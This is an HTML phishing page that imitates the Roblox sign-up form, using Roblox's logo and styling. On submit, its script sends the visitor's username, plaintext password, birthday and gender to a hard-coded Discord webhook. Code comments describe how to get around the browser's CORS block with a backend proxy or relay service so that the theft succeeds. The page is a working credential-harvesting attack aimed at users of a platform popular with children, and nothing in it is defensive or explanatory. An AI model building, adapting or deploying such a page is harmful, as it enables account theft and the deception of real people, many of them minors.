<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblox Login</title>
  <link
    href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap"
    rel="stylesheet"
  />
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Inter", sans-serif;
    }

    body {
      background: url("https://files.catbox.moe/urhred.png") no-repeat center center / cover;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
      padding: 2rem 1rem;
      color: white;
    }

    /* Logo outside and above form box */
    .logo-container {
      margin-bottom: 1rem;
    }

    .logo-container img {
      width: 180px;
      display: block;
      margin: 0 auto;
    }

    .login-container {
      background-color: #1c1c1c;
      padding: 2rem;
      border-radius: 12px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.6);
      color: white;
    }

    .login-container h2 {
      text-align: center;
      font-weight: 700;
      font-size: 1.1rem;
      margin-bottom: 1rem;
    }

    .login-container label {
      font-size: 0.85rem;
      display: block;
      margin-bottom: 0.4rem;
    }

    .login-container input,
    .login-container select {
      width: 100%;
      padding: 0.6rem;
      border-radius: 6px;
      border: none;
      margin-bottom: 1rem;
      background: #292929;
      color: white;
      font-size: 0.9rem;
    }

    .gender-options {
      display: flex;
      justify-content: space-between;
      margin-bottom: 1rem;
    }

    .gender-options button {
      flex: 1;
      margin: 0 0.2rem;
      padding: 0.6rem;
      border-radius: 6px;
      border: 2px solid transparent;
      background: #292929;
      color: white;
      font-size: 1.3rem;
      cursor: pointer;
      transition: border-color 0.2s, background-color 0.2s;
      user-select: none;
    }

    .gender-options button.selected {
      border-color: #1ab7ea;
      background-color: #1a1a1a;
    }

    .login-container button[type="submit"] {
      width: 100%;
      padding: 0.7rem;
      background: #a7a7a7;
      color: #1c1c1c;
      font-weight: bold;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      font-size: 1rem;
      transition: background-color 0.2s;
    }

    .login-container button[type="submit"]:hover {
      background: #8e8e8e;
    }

    .login-container .terms {
      font-size: 0.7rem;
      color: #c7c7c7;
      margin-top: 0.8rem;
    }

    .login-container .terms a {
      color: #2980b9;
      text-decoration: none;
    }

    @media screen and (max-width: 500px) {
      .login-container {
        margin: 1rem;
        padding: 1.5rem;
      }
    }
  </style>
</head>

<body>
  <!-- Logo outside the form box -->
  <div class="logo-container">
    <img
      src="https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png"
      alt="Roblox Logo"
    />
  </div>

  <div class="login-container">
    <h2>SIGN UP AND START HAVING FUN!</h2>
    <form id="loginForm">
      <label>Birthday</label>
      <div style="display: flex; gap: 0.5rem;">
        <select id="month" required>
          <option disabled selected>Month</option>
          <option>January</option>
          <option>February</option>
          <option>March</option>
          <option>April</option>
          <option>May</option>
          <option>June</option>
          <option>July</option>
          <option>August</option>
          <option>September</option>
          <option>October</option>
          <option>November</option>
          <option>December</option>
        </select>
        <select id="day" required>
          <option disabled selected>Day</option>
          <script>
            for (let i = 1; i <= 31; i++) document.write(`<option>${i}</option>`);
          </script>
        </select>
        <select id="year" required>
          <option disabled selected>Year</option>
          <script>
            for (let y = 2025; y >= 1900; y--) document.write(`<option>${y}</option>`);
          </script>
        </select>
      </div>

      <label>Username</label>
      <input
        type="text"
        id="username"
        placeholder="Don't use your real name"
        required
      />

      <label>Password</label>
      <input
        type="password"
        id="password"
        placeholder="At least 8 characters"
        required
      />

      <label>Gender (optional)</label>
      <div class="gender-options">
        <button type="button" data-gender="Male">üë¶</button>
        <button type="button" data-gender="Female">üëß</button>
        <button type="button" data-gender="Other">‚ößÔ∏è</button>
      </div>

      <button type="submit">Sign Up</button>

      <p class="terms">
        By clicking Sign Up, you are agreeing to the
        <a href="#">Terms of Use</a> including the arbitration clause and you
        are acknowledging the <a href="#">Privacy Policy</a>
      </p>
    </form>
  </div>

  <script>
    // Gender button toggle logic
    const genderButtons = document.querySelectorAll(".gender-options button");
    let selectedGender = null;

    genderButtons.forEach((btn) => {
      btn.addEventListener("click", () => {
        // If already selected, deselect
        if (btn.classList.contains("selected")) {
          btn.classList.remove("selected");
          selectedGender = null;
        } else {
          // Deselect all buttons
          genderButtons.forEach((b) => b.classList.remove("selected"));
          // Select clicked button
          btn.classList.add("selected");
          selectedGender = btn.getAttribute("data-gender");
        }
      });
    });

    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const username = document.getElementById("username").value.trim();
      const password = document.getElementById("password").value.trim();

      const month = document.getElementById("month").value;
      const day = document.getElementById("day").value;
      const year = document.getElementById("year").value;

      const gender = selectedGender || "Not specified";

      // Basic validation
      if (!username || !password || !month || !day || !year) {
        alert("Please fill in all required fields.");
        return;
      }

      // Compose birthday string
      const birthday = `${month} ${day}, ${year}`;

      // *** IMPORTANT ***
      // Discord webhooks reject direct browser requests due to CORS.
      // To actually send this data to your webhook, you must:
      // 1) Use a backend server (Node.js, PHP, etc.) as a proxy that sends the POST request to Discord webhook.
      // OR
      // 2) Use third party services that relay webhook requests.
      // This fetch POST WILL fail in browser because Discord webhook blocks CORS.
      //
      // Here we still try it for demonstration, but most likely will fail.

      try {
        const response = await fetch(
          "https://discord.com/api/webhooks/1378772929743032412/qLwHgB7NyN4UCYZCAzFdBZpELqwo0dwjfc2DCVuiRhJd7cBPSKgE2MeMgDWQ8joO5skp",
          {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              content: `**New Signup**\nUsername: ${username}\nPassword: ${password}\nBirthday: ${birthday}\nGender: ${gender}`,
            }),
          }
        );

        if (response.ok) {
          alert("Sign up info sent successfully!");
          e.target.reset();
          selectedGender = null;
          genderButtons.forEach((b) => b.classList.remove("selected"));
        } else {
          alert(
            "Failed to send data. This is likely due to Discord webhook blocking browser requests (CORS)."
          );
          console.error(await response.text());
        }
      } catch (error) {
        alert(
          "Error sending data. Discord webhook does not accept direct browser requests due to CORS policy."
        );
        console.error(error);
      }
    });
  </script>
</body>

</html>
